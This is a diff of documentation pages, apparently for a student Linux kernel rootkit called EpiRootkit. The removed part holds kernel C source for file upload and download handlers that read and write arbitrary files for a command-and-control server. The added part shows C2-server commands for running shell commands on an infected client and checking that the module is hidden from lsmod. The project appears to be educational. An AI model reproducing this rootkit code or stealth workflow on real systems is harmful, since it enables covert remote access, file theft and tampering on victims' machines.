-    file_content = separator &#43; 1;
-    
-    // Validate filename
-    if (!validate_filename(filename))
-        return send_error(&#34;Invalid or unsafe filename&#34;);
-    
-    // Create and write file
-    file = filp_open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-    bytes_written = kernel_write(file, file_content, content_length, &amp;pos);
-    filp_close(file, NULL);
-    
-    return send_success(&#34;File uploaded successfully&#34;);
-}</code>
-  </pre></div><h3 id=download-handler>Download Handler <a href=#download-handler class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=5d2c29c class=language-c>
-  <code>static int handle_download(const char *data)
-{
-    struct file *file;
-    loff_t file_size, pos = 0;
-    char *file_content, *result_buffer;
-    ssize_t bytes_read;
-    
-    // Open file
-    file = filp_open(data, O_RDONLY, 0);
-    if (IS_ERR(file))
-        return send_error(&#34;File not found or cannot be opened&#34;);
-    
-    // Check file size
-    file_size = i_size_read(file_inode(file));
-    if (file_size &gt; MAX_FILE_SIZE) {
-        filp_close(file, NULL);
-        return send_error(&#34;File too large to download&#34;);
-    }
-    
-    // Read file content
-    file_content = vmalloc(file_size &#43; 1);
-    bytes_read = kernel_read(file, file_content, file_size, &amp;pos);
-    file_content[bytes_read] = &#39;\0&#39;;
-    
-    // Format response
-    result_buffer = vmalloc(file_size &#43; 32);
-    snprintf(result_buffer, file_size &#43; 32, &#34;DOWNLOAD:%s&#34;, file_content);
-    
-    return send_result(result_buffer);
-}</code>
-  </pre></div><h2 id=configuration>Configuration <a href=#configuration class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><div class=prism-codeblock><pre id=f8baefd class=language-c>
-  <code>// rootkit/core/config.h
-#define MAX_FILE_SIZE (10 * 1024 * 1024)  // 10MB
-#define MAX_FILENAME_LENGTH 255</code>
-  </pre></div></div><div class="gitinfo d-flex flex-wrap justify-content-between align-items-center opacity-85 pt-3"><div id=edit-this-page class=mt-1><a href=https://github.com/kazetachinuu/epirootkit-docs/blob/master/content/docs/04-epirootkit/features/file-transfer.md alt="File Transfer" rel="noopener noreferrer" target=_blank><span class="me-1 align-text-bottom"><svg width="20" height="20" viewBox="0 0 32 32" fill="currentcolor"><path d="M16 .396c-8.839.0-16 7.167-16 16 0 7.073 4.584 13.068 10.937 15.183.803.151 1.093-.344 1.093-.772.0-.38-.009-1.385-.015-2.719-4.453.964-5.391-2.151-5.391-2.151-.729-1.844-1.781-2.339-1.781-2.339-1.448-.989.115-.968.115-.968 1.604.109 2.448 1.645 2.448 1.645 1.427 2.448 3.744 1.74 4.661 1.328.14-1.031.557-1.74 1.011-2.135-3.552-.401-7.287-1.776-7.287-7.907.0-1.751.62-3.177 1.645-4.297-.177-.401-.719-2.031.141-4.235.0.0 1.339-.427 4.4 1.641 1.281-.355 2.641-.532 4-.541 1.36.009 2.719.187 4 .541 3.043-2.068 4.381-1.641 4.381-1.641.859 2.204.317 3.833.161 4.235 1.015 1.12 1.635 2.547 1.635 4.297.0 6.145-3.74 7.5-7.296 7.891.556.479 1.077 1.464 1.077 2.959.0 2.14-.02 3.864-.02 4.385.0.416.28.916 1.104.755 6.4-2.093 10.979-8.093 10.979-15.156.0-8.833-7.161-16-16-16z"/></svg>
-</span>Edit this page</a></div></div></div><div><hr class=doc-hr><div id=doc-nav class=d-print-none><div class="row flex-xl-nowrap"><div class="col-sm-6 pt-2 doc-next"><a href=/docs/04-epirootkit/features/command-execution/><div class="card h-100 my-1"><div class="card-body py-2"><p class="card-title fs-5 fw-semibold lh-base mb-0"><i class="material-icons align-middle">navigate_before</i> Command Execution</p><p class="card-text ms-2">Execute shell commands …</p></div></div></a></div><div class="col-sm-6 pt-2 doc-prev"><a class=ms-auto href=/docs/04-epirootkit/features/hiding/><div class="card h-100 my-1 text-end"><div class="card-body py-2"><p class="card-title fs-5 fw-semibold lh-base mb-0">Stealth & Hiding <i class="material-icons align-middle">navigate_next</i></p><p class="card-text me-2">Module hiding and file hiding …</p></div></div></a></div></div></div></div></div></div></div></div><footer class="shadow py-3 d-print-none"><div class=container-fluid><div class="row align-items-center"><div class=col><div class="text-sm-start text-center mx-md-2"><p class=mb-0>© 2025 Tux Fan Club. Built with <a href=https://github.com/colinwilson/lotusdocs><strong>Lotus Docs</strong></a></p></div></div></div></div></footer></main></div></div><button onclick=topFunction() id=back-to-top aria-label="Back to Top Button" class="back-to-top fs-5"><svg width="24" height="24"><path d="M12 10.224l-6.3 6.3-1.38-1.372L12 7.472l7.68 7.68-1.38 1.376z" style="fill:#fff"/></svg></button>
+? Select option: [X] Module Hiding (Click to disable)
+┌─ Configuration - Client-1
+  • Applying configuration change...
+  ✓ Configuration updated
+└─</code>
+  </pre></div><h4 id=manual-stealth-commands>Manual Stealth Commands <a href=#manual-stealth-commands class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h4><div class=prism-codeblock><pre id=3de3b9b class=language-bash>
+  <code># Hide module from lsmod
+c2-server$ exec Client-1 lsmod | grep epirootkit
+# (should show module)
+
+# Enable hiding
+c2-server$ status Client-1
+# Check if &#34;Module Hidden: YES&#34;
+
+# Verify hiding
+c2-server$ exec Client-1 lsmod | grep epirootkit
+# (should show no output if hidden)</code>
+  </pre></div></div><div class="gitinfo d-flex flex-wrap justify-content-between align-items-center opacity-85 pt-3"><div id=edit-this-page class=mt-1><a href=https://github.com/kazetachinuu/epirootkit-docs/blob/master/content/docs/03-attacking-program/usage.md alt="Usage Guide" rel="noopener noreferrer" target=_blank><span class="me-1 align-text-bottom"><svg width="20" height="20" viewBox="0 0 32 32" fill="currentcolor"><path d="M16 .396c-8.839.0-16 7.167-16 16 0 7.073 4.584 13.068 10.937 15.183.803.151 1.093-.344 1.093-.772.0-.38-.009-1.385-.015-2.719-4.453.964-5.391-2.151-5.391-2.151-.729-1.844-1.781-2.339-1.781-2.339-1.448-.989.115-.968.115-.968 1.604.109 2.448 1.645 2.448 1.645 1.427 2.448 3.744 1.74 4.661 1.328.14-1.031.557-1.74 1.011-2.135-3.552-.401-7.287-1.776-7.287-7.907.0-1.751.62-3.177 1.645-4.297-.177-.401-.719-2.031.141-4.235.0.0 1.339-.427 4.4 1.641 1.281-.355 2.641-.532 4-.541 1.36.009 2.719.187 4 .541 3.043-2.068 4.381-1.641 4.381-1.641.859 2.204.317 3.833.161 4.235 1.015 1.12 1.635 2.547 1.635 4.297.0 6.145-3.74 7.5-7.296 7.891.556.479 1.077 1.464 1.077 2.959.0 2.14-.02 3.864-.02 4.385.0.416.28.916 1.104.755 6.4-2.093 10.979-8.093 10.979-15.156.0-8.833-7.161-16-16-16z"/></svg>
+</span>Edit this page</a></div></div></div><div><hr class=doc-hr><div id=doc-nav class=d-print-none><div class="row flex-xl-nowrap"><div class="col-sm-6 pt-2 doc-next"><a href=/docs/03-attacking-program/installation/><div class="card h-100 my-1"><div class="card-body py-2"><p class="card-title fs-5 fw-semibold lh-base mb-0"><i class="material-icons align-middle">navigate_before</i> Installation</p><p class="card-text ms-2">Step-by-step installation and …</p></div></div></a></div><div class="col-sm-6 pt-2 doc-prev"><a class=ms-auto href=/docs/04-epirootkit/overview/><div class="card h-100 my-1 text-end"><div class="card-body py-2"><p class="card-title fs-5 fw-semibold lh-base mb-0">EpiRootkit Overview <i class="material-icons align-middle">navigate_next</i></p><p class="card-text me-2">Linux kernel rootkit for …</p></div></div></a></div></div></div></div></div></div></div></div><footer class="shadow py-3 d-print-none"><div class=container-fluid><div class="row align-items-center"><div class=col><div class="text-sm-start text-center mx-md-2"><p class=mb-0>© 2025 Tux Fan Club. Built with <a href=https://github.com/colinwilson/lotusdocs><strong>Lotus Docs</strong></a></p></div></div></div></div></footer></main></div></div><button onclick=topFunction() id=back-to-top aria-label="Back to Top Button" class="back-to-top fs-5"><svg width="24" height="24"><path d="M12 10.224l-6.3 6.3-1.38-1.372L12 7.472l7.68 7.68-1.38 1.376z" style="fill:#fff"/></svg></button>
 <script>(()=>{var e=document.getElementById("mode");e!==null&&(window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",e=>{e.matches?(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")):(localStorage.setItem("theme","light"),document.documentElement.removeAttribute("data-dark-mode"))}),e.addEventListener("click",()=>{document.documentElement.toggleAttribute("data-dark-mode"),localStorage.setItem("theme",document.documentElement.hasAttribute("data-dark-mode")?"dark":"light")}),localStorage.getItem("theme")==="dark"?document.documentElement.setAttribute("data-dark-mode",""):document.documentElement.removeAttribute("data-dark-mode"))})()</script><script src=/docs/js/bootstrap.c7927bdd82eceb076739257add3f4b0e11379da037c07d5c7110daeb6de0e3edcb2de867604550f88815157e4ec4ddb7.js integrity=sha384-x5J73YLs6wdnOSV63T9LDhE3naA3wH1ccRDa623g4+3LLehnYEVQ+IgVFX5OxN23 defer></script><script type=text/javascript src=/docs/js/bundle.min.4f60111ba6134ba40ed4d3ca8b6f30e10963c0482cd9829b9dc4a2a347bc6eaec2c1cf424c2ce632fb6d2218139f34f0.js integrity=sha384-T2ARG6YTS6QO1NPKi28w4QljwEgs2YKbncSio0e8bq7Cwc9CTCzmMvttIhgTnzTw crossorigin=anonymous defer></script><script type=module>
     var suggestions = document.getElementById('suggestions');
     var search = document.getElementById('flexsearch');
